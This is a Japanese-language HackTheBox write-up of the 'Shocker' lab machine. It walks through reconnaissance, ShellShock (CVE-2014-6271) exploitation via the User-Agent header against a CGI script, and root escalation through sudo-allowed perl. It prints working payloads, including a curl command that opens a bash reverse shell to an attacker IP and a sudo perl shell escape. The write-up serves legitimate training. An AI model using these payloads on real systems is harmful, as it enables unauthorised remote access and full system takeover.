+++
title = "HackTheBox - Shocker Writeup"
date = "2026-04-06"
description = "ShellShock (CVE-2014-6271) を悪用した Apache CGI 経由のRCEと sudo perl による権限昇格"
tags = ["HackTheBox", "CTF", "Linux", "ShellShock", "CVE-2014-6271", "gobuster", "curl", "perl", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Shocker |
| OS | Linux (Ubuntu) |
| Difficulty | Easy |
| IP | 10.129.14.130 |
| Key Vulnerability | ShellShock — CVE-2014-6271 |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV 10.129.14.130
```

```text
Starting Nmap 7.98 at 2026-04-06 14:37 +0900
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**観察：**
- ポート **80** — Apache 2.4.18（古いバージョン）
- ポート **2222** — SSH（非標準ポート）
- マシン名「Shocker」＋ Apache CGI → **ShellShock** を示唆

---

## Web Fuzzing

### Step 1：ルートディレクトリのファジング

```bash
gobuster dir -u http://10.129.14.130/ -w /usr/share/wordlists/dirb/common.txt
```

```text
.hta                 (Status: 403)
.htpasswd            (Status: 403)
.htaccess            (Status: 403)
cgi-bin/             (Status: 403)   ← 発見！
index.html           (Status: 200)
server-status        (Status: 403)
```


### Step 2：cgi-bin 内のスクリプト探索

```bash
gobuster dir -u http://10.129.14.130/cgi-bin/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x sh,cgi,pl
```

```text
user.sh   (Status: 200) [Size: 118]   ← 発見！
```

`/cgi-bin/user.sh` が存在することを確認。アクセスすると `uptime` コマンドの出力が返ってくる（CGI bash スクリプトの証拠）。

---

## ShellShock 脆弱性の確認

**CVE-2014-6271（ShellShock / Bashdoor）**：
Bash の関数定義構文の欠陥。HTTP ヘッダー経由で環境変数として渡された文字列にコマンドを埋め込むことで、CGI スクリプト実行時に任意コマンドを実行できる。

### Burp Suite でテスト

`User-Agent` ヘッダーを以下のペイロードに書き換えてリクエストを送信：

```http
GET /cgi-bin/user.sh HTTP/1.1
Host: 10.129.14.130
User-Agent: () { :;}; echo; /usr/bin/id
```

```text
HTTP/1.1 200 OK
...
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),...
```

**RCE 確認。** `shelly` ユーザーとしてコマンド実行が可能。

---

## Listener

別ターミナルでリスナーを起動：

```bash
nc -nvlp 4444
```

---

## Trigger（リバースシェルの発火）

```bash
curl -H "User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.10.16.166/4444 0>&1" \
  http://10.129.14.130/cgi-bin/user.sh
```

---

## Foothold

```bash
whoami
```

```text
shelly
```

`shelly` ユーザーとしてシェルを取得。

---

## System Info

```bash
uname -a
```

```text
Linux Shocker 4.4.0-96-generic #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

---

## Flags

### User

```bash
cat /home/shelly/user.txt
```


---

## Post Exploitation

```bash
sudo -l
```

```text
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```


---

## Privilege Escalation

[GTFOBins — perl](https://gtfobins.github.io/gtfobins/perl/) を参照。

```bash
sudo perl -e 'exec "/bin/bash";'
```

---

## Root Shell

```bash
whoami
```

```text
root
```

---

## Flags

### Root

```bash
cd /root
cat root.txt
```

✅ root フラグ取得

---

## Summary

```
Web Fuzzing (/cgi-bin/user.sh 発見)
    ↓
ShellShock (CVE-2014-6271) — User-Agent ヘッダーインジェクション
    ↓
Reverse Shell (shelly として初期アクセス)
    ↓
sudo -l → perl NOPASSWD
    ↓
GTFOBins (sudo perl) → root 権限昇格
```

### 学んだこと

| ポイント | 詳細 |
|---------|------|
| トレイリングスラッシュ問題 | gobuster は `-f` フラグなしで cgi-bin を見逃す場合がある |
| CGI + 古い Bash | ShellShock の典型的な攻撃対象 |
| sudo -l の重要性 | シェル取得後の最初の確認コマンド |
| GTFOBins | sudo 許可バイナリの権限昇格手法を網羅したリファレンス |
